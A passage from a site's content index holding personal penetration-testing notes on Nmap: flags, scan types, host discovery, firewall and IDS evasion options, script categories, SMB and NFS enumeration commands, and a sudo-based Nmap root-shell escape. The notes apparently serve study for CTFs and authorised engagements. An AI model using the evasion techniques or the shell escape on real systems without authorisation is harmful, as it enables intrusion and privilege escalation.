style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;nikto&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -H&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;            # Long help (all commands)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;nikto&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -list-plugins&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt; # List plugins&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;"},"spells/Nmap":{"slug":"spells/Nmap","filePath":"spells/Nmap.md","title":"Nmap","links":["spells/TCP-header-flags","spells/TCP-headers","spells/TCP","spells/ICMP","spells/UDP","spells/HTTP","spells/MAC-address","spells/man","spells/ARP","spells/TCP-window-size","spells/grep","spells/NFS","spells/sudo"],"tags":["Application/Nmap","Protocol/TCP","OS/Windows/Firewall","Protocol/ICMP","AttackCycle/Reconnaissance","Protocol/UDP","Protocol/HTTP","Protocol/SOCKS","Hardware/MACAddress","Protocol/ARP","Protocol/SMB","Protocol/NFS","AttackCycle/PrivEsc"],"content":"Note that Nmap accepts ranges in any octet of an IP address; for example, 10.10.0-255.1-255 will scan 10.10.0.1 – 10.10.255.255.\nWhen dealing with firewalls, be aware that the default Nmap SYN scan packet is 44 bytes = 20 bytes IP header + 24 bytes TCP header + 0 bytes data. Note that packet fragmentation only affects the TCP header + data — the 20 byte IP header will always be sent!\nMost Nmap scans will generate ~2x the number of packets as scanned ports, as unresponsive ports are sent a second packet to verify that they’re actually closed (and, in general, most ports will be closed).\nFlags\n\n-A — “Aggressive” scan; alias for -O -sC -sV --traceroute.\n-D — Send multiple scan requests using decoys; specified using a list of arbitrary IP addresses. The special “addresses” ME and RND represent the attacker (you!) and a random IP address, respectively. If ME isn’t included in the list, it will be inserted into a random position. Trades stealth for “chaff”. Maybe only useful as a diversion?\n-e — Specify the network interface to use during scanning.\n-f — Fragment (TCP) packets into chunks of 8 bytes or less. Can help evade some next-gen firewall / IDS alarms.\n-ff — Fragment (TCP) packets into chunks of 16 bytes or less. Can help evade some next-gen firewall / IDS alarms.\n-F — “Fast” scan. Alias for --top-ports 100.\n-g — Use the specified source port number, rather than a random source port. Useful for bypassing some stateless firewalls.\n-iL — Use a file for Nmap’s scan targets.\n-n — Don’t resolve host names using DNS (or do reverse DNS resolution).\n-O — OS detection. Generally requires at least one open and one closed port to be detected, and results will be distorted if the target is virtualized. The OS type is much more reliably detected than the OS version.\n-p- — Scan all ports. (The end/beginning of port ranges can be excluded to represent 1/65535, so -p- is equivalent to -p1-65535.) If omitted, the 1000 most common ports are scanned by default.\n-Pn — Scan the host even if it doesn’t respond to an initial ping. Necessary for scanning/discovering modern Windows systems, since the Windows Firewall blocks ICMP by default.\n-r — Scan ports in sequential order (rather than randomly). Can make for more accurate scans for targets that have only recently been brought online.\n-R — Perform reverse DNS resolution even for offline hosts.\n-sC — Scan with “default” script set; equivalent to --script default. Mostly provides basic intelligence.\n-sV — Service detection. The same as -sT (because a full TCP connection is required to gather the necessary information), but probes listening services for additional information.\n-S — Use a spoofed IP address for the scan. Only useful if you can actually capture incoming packets at that IP address! Generally must be combined with the -e and -Pn flags.\n-T — Specify timing from 0 – 5. -T0 will wait 5 minutes between ports. -T1 is typical on engagements. -T3 is the default. -T4 is typical on CTFs. -T5 is not recommended, as it is so fast that it may lead to packet loss.\n-v — Increase Nmap’s verbosity. There are four verbosity levels for Nmap: -v &lt; -vv &lt; -d &lt; -dd. In practice, I’ve found anything above -v too noisy for general use.\n\nThere’s more, but these are the big ones.\nLong flags\nMany of Nmap’s long flags are intended to aid in firewall and IDS evasion.\n\n--badsum — Produce packets with an invalid checksum. These should be dropped by normal hosts, but many IDS solutions respond to these. This can be useful for reconnaissance.\n--data-length — Append random data to Nmap TCP packets to ensure that all packets are the same length. By default, Nmap appends no data after the TCP header; padding this out can make scans look more innocuous. Values &lt; 24 only affect fragmented packets (since the TCP header is already 24 bytes). Disables protocol-specific payloads, which can decrease scan accuracy, particularly for UDP scans.\n--dns-servers — Specify DNS server(s) to use for hostname resolution and reverse lookups.\n--ip-options — Specify the IP “Options” field as either a string of hex-encoded bytes (\\x00, etc.) or one of the shortcut options R (record-route), T (record-timestamp), U (R and T), L (loose source routing), and S (strict source routing). Both L and S must be followed by a space-separated list of IP addresses to route the packet through (the entire sting must be quoted), and are used to route around security appliances.\n--max-parallelism — The maximum number of probes to run in parallel. Overrides -T.\n--max-rate — The maximum number of packets/second to send. Overrides -T.\n--min-parallelism — The minimum number of probes to run in parallel. Overrides -T.\n--min-rate — The minimum number of packets/second to send. Overrides -T.\n--mtu — Fragment packets into a chosen multiple of 8. Setting --mtu 8 is equivalent to -f, and --mtu 16 is the same as -ff.\n--open — Only report back machines with open ports (most useful when used in conjunction with -p).\n--proxies — Use an HTTP or SOCKS4 proxy. Specify a comma-separated list to chain proxies together.\n--reason — Show the reason that Nmap made a particular identification. Kinda fun.\n--scan-delay — Add a delay (in milliseconds) between ports/hosts. Helpful for IDS evasion, but makes things slow.\n--scanflags — Specify the TCP flags used to probe ports during a scan using URG, PSH, RST, SYN, ACK, FIN (e.g., --scanflags URGPSHFIN is the same as -sX). Overrides the explicit scanning options in the following sections.\n--script — Run specified scripts, or all scripts in a specified category (as applicable). Also accepts wildcard matches (e.g., ftp*). See next section for script category breakdown.\n--script-help — Return the “help” comment block at the top of a script file.\n--source-port — Specify the source port for a scan. possibly useful to evade some firewall rules?\n--spoof-mac — Use a spoofed MAC address for the scan. Obviously only matters when you’re on the same subnet as the target; otherwise has the same caveats as IP spoofing.\n--top-ports — Scan only the X most common ports. Nmap’s default is --top-ports 1000. Can be useful for detecting locked-down hosts (use --top-ports 10 -Pn). Overridden when using -p.\n--traceroute — Perform a traceroute between the attacker and target systems. Note that Nmap’s traceroute works in the opposite fashion (high TTL to low TTL) than traceroute/tracert. Note that most routers will not send ICMP TTL exceeded packets, and will thus show up as *.\n--ttl — Set a custom TTL. Does not always work as you’d expect in my experience!\n--version-intensity — Determine how much service information to collect (and thus how noisy the associated probes will be) with -sV. Ranges from 0 – 9; --version-light is equivalent to 2, --version-all is equivalent to 9.\n\nNmap has a ton of flags. Be sure to check the man page and official documentation!\nHost discovery\nWhen called as the superuser, Nmap uses ARP for local host discovery and a combination of ICMP Echo, TCP SYN to 443, TCP ACK to 80, and ICMP Timestamp requests for remote host discovery.\nWhen called as a normal user, Nmap has more limited options and uses TCP SYN packets sent for ports 80 and 443 for both local and remote host discovery.\nDiscovery methods:\n\n-PA — Use TCP ACK packets for host discovery; otherwise the same as -PS.\n-PE — Use ICMP Echo for host discovery. (Note that Nmap will still not send the echo request if host existence can be verified using the initial ARP request.)\n-PM — Use ICMP Address Mask for host discovery. (More-or-less the same as -PP, just a different ICMP request type.)\n-PP — Use ICMP Timestamp for host discovery. (Less likely to be blocked by firewalls than -PE, but also a more unusual request that may stand out. Like -PE, Nmap will still not send the timestamp request if host existence can be verified using the initial ARP request.)\n-PR — Use ARP packets only for host discovery.\n-PS — Use TCP SYN packets for host discovery. Uses port 80 by default, or you can specify a port list (e.g., -PS80,8080,8888) or range (e.g. -PS20-30). (Note that unprivileged users must complete a full TCP handshake.)\n-PU — Use UDP packets for host discovery. Unlike other types of host discovery scans, UDP scans only generate a reply (ICMP Port Unreachable) if the target port is closed.\n\nMost of the time the default discovery options (or -Pn) is fine. The above options are mostly useful for unusual networks or if there’s a need to be extra-stealthy.\nScan types\n\n-sA — ACK scan. All ports should respond with a RST, but firewalls will generally block these requests except for open/forwarded ports. Thus, an ACK scan is useful for probing the configuration of intermediate firewalls (but says nothing about whether services are actually listening on the identified ports).\n-sF — FIN scan. Use and output is similar to a null scan, but is slightly more likely to be blocked.\n-sI — Idle/Zombie scan. The idea here is to choose a machine with no traffic on it and then spoof its IP address. Scans then consist of a SYN/ACK to the zombie to get the current IP ID value for the current port, then a SYN to the target (which should either reply with a RST to the zombie, which doesn’t trigger a response and thus doesn’t increment the IP ID, or a SYN/ACK to the zombie, which will respond with a RST which will increment the IP ID), then a second SYN/ACK to the zombie to see if the IP ID has been incremented by 1 (port closed or filtered on the target) or 2 (port open on the target). Note that zombies need to be systems that increment the IP ID sequentially and globally, and open/closed ports will be from the zombie’s perspective, not the attacker’s. These scans are also slooooow (though not as slow as -T0).\n-sL — Dummy scan. Show the hosts that would be scanned, but don’t actually do anything (except perhaps DNS resolution).\n-sM — Maimon scan (named after Uriel Maimon); the FIN and ACK TCP flags are set. Should always receive a RST, but some older BSD systems drop the packet on open ports. Of limited modern utility.\n-sn — Host discovery only (see the previous section for details). Note that the Windows Firewall blocks ICMP by default.\n-sN — Null scan; no TCP flags are set. Used to circumvent stateless firewalls. Can distinguish between closed and open|filtered.\n-sS — SYN scan. Most common scan, and Nmap’s default. Starts a TCP handshake but then sends a RST after receiving the SYN/ACK packet. Requires root, should not be used on OT. Also called a “stealth scan”, but most IDS solutions detect it these days.\n-sT- TCP connect scan. This makes a full TCP handshake when connecting to each port, then sends a RST/ACK after the handshake is finished. Slow but accurate. This is the only scan available for unprivileged users.\n-sU — UDP scan. Sends empty UDP packets (or more realistic packets for known ports) and listens for a response back (“open”) or a ICMP “port unreachable” packet (“closed”). Since UDP doesn’t require a response, most ports will get marked open|filtered. Can be specified with one of the TCP scans to scan TCP and UDP ports simultaneously. Very slow, so you probably want to use with -sU --top-ports 20.\n-sW — TCP window scan. The same as an ACK scan except that it examines the TCP window field of returned RST packets and uses it to discern if a port responded differently. Note that ports may be reported as closed (and open!) erroneously (as not all systems respond in the same way), but unfiltered ports will be identified. Look for patterns of open/closed ports to try to discern how the target system is responding.\n-sX — Xmas scan; the FIN, URG, and PSH TCP flags are set. Use and output is similar to a null scan.\n\nNote that Nmap by default uses a TCP window of 1024 bytes and an MSS of 1460. This is actually an unusual combination, and makes most Nmap TCP scans stick out in packet captures. The exception to this is a full TCP connect scan, which uses the system TCP stack and thus tends to have more sensible options.\nOutput\n\n-oA — Save the results in “normal”, “grepable”, and XML formats simultaneously. This option will automatically append meaningful extensions (the other options do not do this).\n-oG — Save the results as “grepable” output. This is a compact format meant to automatically provide context when searched with grep.\n-oN — Save results as “normal” output. This is more-or-less what Nmap will print to STDOUT.\n-oX — Save the results as XML, designed to be importable by other applications.\n\nPort states\n\nOpen — The port is reachable and there is a service listening on it.\nClosed — The port is reachable and there is no service listening on it.\nFiltered — Nmap cannot determine the port state because the port is not accessible (probably because of a firewall).\nUnfiltered — Nmap cannot determine the port state, but the port is accessible (only encountered in ACK scans).\nOpen|Filtered — Nmap can only determine that the port is not closed (only encountered in UDP scans and more exotic scans like Xmas).\nClosed|Filtered — Nmap can only determine that the port is not open (only encountered in IP ID idle scans).\n\nScripting engine\nNmap scripting engine categories:\n\nauth — Probes for information about service authentication and bypasses. Does not conduct brute-force attacks.\nbroadcast — Host/network probes using broadcast packets.\nbrute — Attempt to brute-force service credentials.\ndefault — A curated list of fast, reliable scripts. Can also be called using -sC.\ndiscovery — Gather additional information about scanned machines/ports.\ndos — Scripts that may crash machines/services.\nexploit — Attempt to actually exploit identified services.\nexternal — Scripts that send data to third-party services.\nfuzzer — Fuzz identified services.\nintrusive — Scripts that may crash a service, generate lots of log messages, or are otherwise noise / may be considered malicious.\nmalware — Test for the possible presence of malware on the target.\nsafe — The opposite of “intrusive”: scripts that are unlikely to be noisy or perceived as malicious (no guarantees though).\nversion — Scripts called by -sV. Unlike “default”, this category cannot be called directly.\nvuln — Check for potential vulnerabilities. I’ve found that scripts in this category generate a lot of false positives.\n\nYou can also run your own scripts.\nTargeted reconnaissance\nCIFS\nTypical Nmap portscan output for CIFS:\nPORT    STATE SERVICE      REASON\n139/tcp open  netbios-ssn  syn-ack\n445/tcp open  microsoft-ds syn-ack\n\nCIFS users and shares can be enumerated by Nmap during scanning:\nnmap -vv -sT \\\n     --script smb-enum-shares.nse,smb-enum-users.nse \\\n     -p445 $TARGET_IP\n\n\n                  \n                  Tip\n                  \n                \n\n\nWhile smb-enum-shares.nse returns results for UNIX-like systems, I’ve found smb-enum-users.nse to be kind of hit-or-miss.\n\n\n\nNFS\nNFS shares can be enumerated by Nmap during scanning:\nnmap -v -sT --script nfs-ls,nfs-statfs,nfs-showmount \\\n     -p$PORT $IP\nNormally $PORT is 111.\nShell escape\nIf Nmap can be run with NOPASSWD via sudo, then you can break out into a root shell by creating a file containing os.execute(&quot;/bin/sh&quot;) and then running nmap --script=$FILE.","richContent":"&lt;p&gt;Note that Nmap accepts ranges in any octet of an IP address; for example, 10.10.0-255.1-255 will scan 10.10.0.1 – 10.10.255.255.&lt;/p&gt;\n&lt;p&gt;When dealing with firewalls, be aware that the default Nmap &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/TCP-header-flags&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/TCP-header-flags&quot;&gt;SYN&lt;/a&gt; scan packet is 44 bytes = 20 bytes IP header + 24 bytes &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/TCP-headers&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/TCP-headers&quot;&gt;TCP header&lt;/a&gt; + 0 bytes data. Note that packet fragmentation only affects the &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/TCP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/TCP&quot;&gt;TCP&lt;/a&gt; header + data — the 20 byte IP header will always be sent!&lt;/p&gt;\n&lt;p&gt;Most Nmap scans will generate ~2x the number of packets as scanned ports, as unresponsive ports are sent a second packet to verify that they’re actually closed (and, in general, most ports will be closed).&lt;/p&gt;\n&lt;h2 id=&quot;flags&quot;&gt;Flags&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#flags&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;code&gt;-A&lt;/code&gt; — “Aggressive” scan; alias for &lt;code&gt;-O -sC -sV --traceroute&lt;/code&gt;.&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;-D&lt;/code&gt; — Send multiple scan requests using decoys; specified using a list of arbitrary IP addresses. The special “addresses” ME and RND represent the attacker (you!) and a random IP address, respectively. If ME isn’t included in the list, it will be inserted into a random position. Trades stealth for “chaff”. Maybe only useful as a diversion?&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;-e&lt;/code&gt; — Specify the network interface to use during scanning.&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;-f&lt;/code&gt; — Fragment (&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/TCP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/TCP&quot;&gt;TCP&lt;/a&gt;) packets into chunks of 8 bytes or less. Can help evade some next-gen firewall / IDS alarms.&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;-ff&lt;/code&gt; — Fragment (&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/TCP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/TCP&quot;&gt;TCP&lt;/a&gt;) packets into chunks of 16 bytes or less. Can help evade some next-gen firewall / IDS alarms.&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;-F&lt;/code&gt; — “Fast” scan. Alias for &lt;code&gt;--top-ports 100&lt;/code&gt;.&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;-g&lt;/code&gt; — Use the specified source port number, rather than a random source port. Useful for bypassing some stateless firewalls.&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;-iL&lt;/code&gt; — Use a file for Nmap’s scan targets.&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;-n&lt;/code&gt; — Don’t resolve host names using DNS (or do reverse DNS resolution).&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;-O&lt;/code&gt; — OS detection. Generally requires at least one open and one closed port to be detected, and results will be distorted if the target is virtualized. The OS type is much more reliably detected than the OS version.&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;-p-&lt;/code&gt; — Scan all ports. (The end/beginning of port ranges can be excluded to represent 1/65535, so &lt;code&gt;-p-&lt;/code&gt; is equivalent to &lt;code&gt;-p1-65535&lt;/code&gt;.) If omitted, the 1000 most common ports are scanned by default.&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;-Pn&lt;/code&gt; — Scan the host even if it doesn’t respond to an initial ping. &lt;em&gt;Necessary for scanning/discovering modern Windows systems, since the Windows Firewall blocks &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/ICMP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/ICMP&quot;&gt;ICMP&lt;/a&gt; by default.&lt;/em&gt;&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;-r&lt;/code&gt; — Scan ports in sequential order (rather than randomly). Can make for more accurate scans for targets that have only recently been brought online.&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;-R&lt;/code&gt; — Perform reverse DNS resolution even for offline hosts.&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;-sC&lt;/code&gt; — Scan with “default” script set; equivalent to &lt;code&gt;--script default&lt;/code&gt;. Mostly provides basic intelligence.&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;-sV&lt;/code&gt; — Service detection. The same as &lt;code&gt;-sT&lt;/code&gt; (because a full &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/TCP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/TCP&quot;&gt;TCP&lt;/a&gt; connection is required to gather the necessary information), but probes listening services for additional information.&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;-S&lt;/code&gt; — Use a spoofed IP address for the scan. Only useful if you can actually capture incoming packets at that IP address! Generally must be combined with the &lt;code&gt;-e&lt;/code&gt; and &lt;code&gt;-Pn&lt;/code&gt; flags.&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;-T&lt;/code&gt; — Specify timing from 0 – 5. &lt;code&gt;-T0&lt;/code&gt; will wait &lt;em&gt;5 minutes&lt;/em&gt; between ports. &lt;code&gt;-T1&lt;/code&gt; is typical on engagements. &lt;code&gt;-T3&lt;/code&gt; is the default. &lt;code&gt;-T4&lt;/code&gt; is typical on CTFs. &lt;code&gt;-T5&lt;/code&gt; is not recommended, as it is so fast that it may lead to packet loss.&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;-v&lt;/code&gt; — Increase Nmap’s verbosity. There are four verbosity levels for Nmap: &lt;code&gt;-v&lt;/code&gt; &amp;#x3C; &lt;code&gt;-vv&lt;/code&gt; &amp;#x3C; &lt;code&gt;-d&lt;/code&gt; &amp;#x3C; &lt;code&gt;-dd&lt;/code&gt;. In practice, I’ve found anything above &lt;code&gt;-v&lt;/code&gt; too noisy for general use.&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;&lt;a href=&quot;https://nmap.org/book/man-port-scanning-basics.html&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;There’s more&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;, but these are the big ones.&lt;/p&gt;\n&lt;h3 id=&quot;long-flags&quot;&gt;Long flags&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#long-flags&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;Many of Nmap’s long flags are intended to aid in &lt;a href=&quot;https://nmap.org/book/man-bypass-firewalls-ids.html&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;firewall and IDS evasion&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;.&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;code&gt;--badsum&lt;/code&gt; — Produce packets with an invalid checksum. These should be dropped by normal hosts, but many IDS solutions &lt;em&gt;respond&lt;/em&gt; to these. This can be useful for reconnaissance.&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;--data-length&lt;/code&gt; — Append random data to Nmap &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/TCP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/TCP&quot;&gt;TCP&lt;/a&gt; packets to ensure that all packets are the same length. By default, Nmap appends no data after the &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/TCP-headers&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/TCP-headers&quot;&gt;TCP header&lt;/a&gt;; padding this out &lt;em&gt;can&lt;/em&gt; make scans look more innocuous. Values &amp;#x3C; 24 only affect fragmented packets (since the &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/TCP-headers&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/TCP-headers&quot;&gt;TCP header&lt;/a&gt; is already 24 bytes). Disables protocol-specific payloads, which can decrease scan accuracy, particularly for &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/UDP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/UDP&quot;&gt;UDP&lt;/a&gt; scans.&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;--dns-servers&lt;/code&gt; — Specify DNS server(s) to use for hostname resolution and reverse lookups.&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;--ip-options&lt;/code&gt; — Specify the IP “Options” field as either a string of hex-encoded bytes (&lt;code&gt;\\x00&lt;/code&gt;, etc.) or &lt;em&gt;one&lt;/em&gt; of the shortcut options &lt;code&gt;R&lt;/code&gt; (record-route), &lt;code&gt;T&lt;/code&gt; (record-timestamp), &lt;code&gt;U&lt;/code&gt; (&lt;code&gt;R&lt;/code&gt; &lt;em&gt;and&lt;/em&gt; &lt;code&gt;T&lt;/code&gt;), &lt;code&gt;L&lt;/code&gt; (loose source routing), and &lt;code&gt;S&lt;/code&gt; (strict source routing). Both &lt;code&gt;L&lt;/code&gt; and &lt;code&gt;S&lt;/code&gt; must be followed by a space-separated list of IP addresses to route the packet through (the entire sting must be quoted), and are used to route around security appliances.&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;--max-parallelism&lt;/code&gt; — The maximum number of probes to run in parallel. Overrides &lt;code&gt;-T&lt;/code&gt;.&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;--max-rate&lt;/code&gt; — The maximum number of packets/second to send. Overrides &lt;code&gt;-T&lt;/code&gt;.&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;--min-parallelism&lt;/code&gt; — The minimum number of probes to run in parallel. Overrides &lt;code&gt;-T&lt;/code&gt;.&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;--min-rate&lt;/code&gt; — The minimum number of packets/second to send. Overrides &lt;code&gt;-T&lt;/code&gt;.&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;--mtu&lt;/code&gt; — Fragment packets into a chosen multiple of 8. Setting &lt;code&gt;--mtu 8&lt;/code&gt; is equivalent to &lt;code&gt;-f&lt;/code&gt;, and &lt;code&gt;--mtu 16&lt;/code&gt; is the same as &lt;code&gt;-ff&lt;/code&gt;.&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;--open&lt;/code&gt; — Only report back machines with open ports (most useful when used in conjunction with &lt;code&gt;-p&lt;/code&gt;).&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;--proxies&lt;/code&gt; — Use an &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/HTTP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/HTTP&quot;&gt;HTTP&lt;/a&gt; or SOCKS4 proxy. Specify a comma-separated list to chain proxies together.&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;--reason&lt;/code&gt; — Show the reason that Nmap made a particular identification. Kinda fun.&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;--scan-delay&lt;/code&gt; — Add a delay (in milliseconds) between ports/hosts. Helpful for IDS evasion, but makes things &lt;em&gt;slow&lt;/em&gt;.&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;--scanflags&lt;/code&gt; — Specify the &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/TCP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/TCP&quot;&gt;TCP&lt;/a&gt; flags used to probe ports during a scan using URG, PSH, RST, SYN, ACK, FIN (e.g., &lt;code&gt;--scanflags URGPSHFIN&lt;/code&gt; is the same as &lt;code&gt;-sX&lt;/code&gt;). Overrides the explicit scanning options in the following sections.&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;--script&lt;/code&gt; — Run specified scripts, or all scripts in a specified category (as applicable). Also accepts wildcard matches (e.g., &lt;code&gt;ftp*&lt;/code&gt;). See next section for script category breakdown.&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;--script-help&lt;/code&gt; — Return the “help” comment block at the top of a script file.&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;--source-port&lt;/code&gt; — Specify the source port for a scan. possibly useful to evade some firewall rules?&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;--spoof-mac&lt;/code&gt; — Use a spoofed &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/MAC-address&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/MAC-address&quot;&gt;MAC address&lt;/a&gt; for the scan. Obviously only matters when you’re on the same subnet as the target; otherwise has the same caveats as IP spoofing.&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;--top-ports&lt;/code&gt; — Scan only the X most common ports. Nmap’s default is &lt;code&gt;--top-ports 1000&lt;/code&gt;. Can be useful for detecting locked-down hosts (use &lt;code&gt;--top-ports 10 -Pn&lt;/code&gt;). Overridden when using &lt;code&gt;-p&lt;/code&gt;.&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;--traceroute&lt;/code&gt; — Perform a traceroute between the attacker and target systems. Note that Nmap’s traceroute works in the opposite fashion (high TTL to low TTL) than traceroute/tracert. Note that most routers will not send &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/ICMP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/ICMP&quot;&gt;ICMP&lt;/a&gt; TTL exceeded packets, and will thus show up as &lt;code&gt;*&lt;/code&gt;.&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;--ttl&lt;/code&gt; — Set a custom TTL. Does not always work as you’d expect in my experience!&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;--version-intensity&lt;/code&gt; — Determine how much service information to collect (and thus how noisy the associated probes will be) with &lt;code&gt;-sV&lt;/code&gt;. Ranges from 0 – 9; &lt;code&gt;--version-light&lt;/code&gt; is equivalent to 2, &lt;code&gt;--version-all&lt;/code&gt; is equivalent to 9.&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;Nmap has a ton of flags. Be sure to check the &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/man&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/man&quot;&gt;man&lt;/a&gt; page and official documentation!&lt;/p&gt;\n&lt;h3 id=&quot;host-discovery&quot;&gt;Host discovery&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#host-discovery&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 